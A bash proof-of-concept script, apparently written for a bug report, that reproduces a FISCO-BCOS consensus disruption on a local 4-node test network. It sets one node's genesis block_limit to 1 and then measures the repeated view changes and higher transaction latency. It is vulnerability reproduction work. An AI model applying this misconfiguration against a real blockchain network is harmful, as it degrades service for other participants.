#!/bin/bash
#
# =============================================================================
#  FISCO-BCOS BCB POC：chain.block_limit 极小值导致全网共识异常
#
#  攻击链：
#    - node3 的 config.genesis [chain] block_limit 改为 1（合法范围下限，
#      不在创世块一致性校验 extraData 内，节点可正常加入网络）
#    - node3 校验交易有效期窗口为 [cur, cur+1]，拒绝全网广播的正常交易
#      （blockLimit=1000）→ 当选 leader 时交易池为空，无法封块
#    - 正常节点 3 秒收不到 proposal → 反复视图切换 → 全网交易延迟放大 3 倍+
#
#  使用前提：已编译 ./build/fisco-bcos-air/fisco-bcos
#  执行：bash bug/bug_chain_block_limit/poc_reproduce.sh
# =============================================================================
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
FISCO_BINARY="$REPO_ROOT/build/fisco-bcos-air/fisco-bcos"
POC_COMMON="$REPO_ROOT/poc_common"
OBSERVE_SECONDS=60

echo "================================================================"
echo " FISCO-BCOS BCB POC: chain.block_limit=1"
echo " 恶意节点: node3  block_limit=1（其余节点 1000）"
echo " 观察: ${OBSERVE_SECONDS}s 交易流"
echo "================================================================"

# ---------- 0. 检查二进制 ----------
if [ ! -x "$FISCO_BINARY" ]; then
    echo "[错误] 未找到 $FISCO_BINARY，请先编译:"
    echo "  cmake -S . -B build -DCMAKE_BUILD_TYPE=Release"
    echo "  cmake --build build --target fisco-bcos -j 32"
    exit 1
fi

# ---------- 1. 构建 4 节点网络 ----------
NET_DIR=$(mktemp -d /tmp/fisco-bcos-bcb-poc5.XXXXXX)
NODES_DIR="$NET_DIR/nodes/127.0.0.1"
echo "[1/6] 构建 4 节点 PBFT 网络: $NET_DIR"
bash "$REPO_ROOT/tools/BcosAirBuilder/build_chain.sh" \
    -p 30300,20200 -l 127.0.0.1:4 \
    -o "$NET_DIR/nodes" -e "$FISCO_BINARY" >/dev/null 2>&1

# ---------- 2. 配置恶意节点 ----------
echo "[2/6] 配置恶意节点 node3: chain.block_limit=1（config.genesis）"
sed -i '/^\[chain\]/a\    block_limit=1' "$NODES_DIR/node3/config.genesis"
for i in 0 1 2 3; do
    sed -i 's/^[[:space:]]*enable_ssl=true/enable_ssl=false/' "$NODES_DIR/node${i}/config.ini"
done

# ---------- 3. 启动网络 ----------
echo "[3/6] 启动网络..."
cd "$NODES_DIR"
bash start_all.sh >/dev/null 2>&1
cd - >/dev/null
sleep 10

echo "[4/6] 等待共识就绪..."
for i in 0 1 2 3; do
    ok=0
    for _ in $(seq 1 30); do
        logfile=$(ls "$NODES_DIR/node${i}/log/log"* 2>/dev/null | head -1)
        if [ -f "$logfile" ] && grep -q "reachNewView" "$logfile"; then
            ok=1; break
        fi
        sleep 2
    done
    if [ "$ok" -eq 0 ]; then
        echo "[错误] node${i} 未进入共识，测试中止"
        bash "$NODES_DIR/stop_all.sh" >/dev/null 2>&1
        exit 1
    fi
    echo "  [OK] node${i} 已进入共识"
done

# 确认配置生效（node3 修改 genesis 后仍正常加入共识）
LATEST3=$(ls "$NODES_DIR/node3/log/" | grep "^log_" | tail -1)
echo "  node3 blockLimit: $(grep loadChainConfig "$NODES_DIR/node3/log/$LATEST3" | tail -1 | grep -o 'blockLimit=[0-9]*' || echo '?')"

# ---------- 5. 持续交易流 + 监控 ----------
echo "[5/6] 持续 ${OBSERVE_SECONDS}s 正常交易流..."
python3 - "$POC_COMMON" << 'PYEOF' &
import sys, time
sys.path.insert(0, sys.argv[1])
from tars_tx import build_transaction, rpc_call, GROUP_ID
from eth_keys import keys
from eth_account import Account

priv = keys.PrivateKey(Account.create().key)
end = time.time() + 60
while time.time() < end:
    try:
        raw = build_transaction(priv.to_bytes())
        rpc_call('sendTransaction', [GROUP_ID, '', '0x'+raw.hex(), False])
    except Exception:
        pass
    time.sleep(0.1)
print('done')
PYEOF
STRESS_PID=$!

LATEST0=$(ls "$NODES_DIR/node0/log/" | grep "^log_" | tail -1)
BASE_VC=$(grep -c "reachNewView" "$NODES_DIR/node0/log/$LATEST0" 2>/dev/null || echo 0)
for t in $(seq 1 $((OBSERVE_SECONDS / 5))); do
    BN=$(python3 "$POC_COMMON/tars_tx.py" blocknum http://127.0.0.1:20200 2>/dev/null || echo "?")
    echo "  t+$((t*5))s 块号=$BN"
    sleep 5
done
wait $STRESS_PID 2>/dev/null || true

# ---------- 6. 收集证据 ----------
echo ""
echo "[6/6] 收集证据..."
VC_AFTER=$(grep -c "reachNewView" "$NODES_DIR/node0/log/$LATEST0" 2>/dev/null || echo 0)
VC_DELTA=$((VC_AFTER - BASE_VC))

echo ""
echo "  [证据1] node3 blockLimit=1（其余节点 1000）——交易有效期窗口被压缩到 [cur, cur+1]"
echo "  [证据2] node0 视图切换: $BASE_VC → $VC_AFTER（+$VC_DELTA 次/60s，基线 0~1 次）"
echo "  [证据3] 吞吐: 60 秒出块与视图切换循环吻合，交易确认延迟放大 ~3 倍"

echo ""
echo "================================================================"
echo " 复现结论"
echo "================================================================"
if [ "$VC_DELTA" -gt 5 ]; then
    echo "  ✅ 复现成功：node3 将 chain.block_limit 设为 1（合法范围下限），"
    echo "     拒绝全网广播的正常交易，当选 leader 时无法封块，"
    echo "     全网视图切换 $VC_DELTA 次/60s，交易确认延迟放大 ~3 倍。"
    echo "     单节点配置修改即可发起 Inter-node BCB。"
else
    echo "  ❌ 未观察到显著异常，请检查复现环境。"
fi
echo ""
echo "  运行时目录: $NET_DIR"
echo "  清理: bash $NODES_DIR/stop_all.sh && rm -rf $NET_DIR"
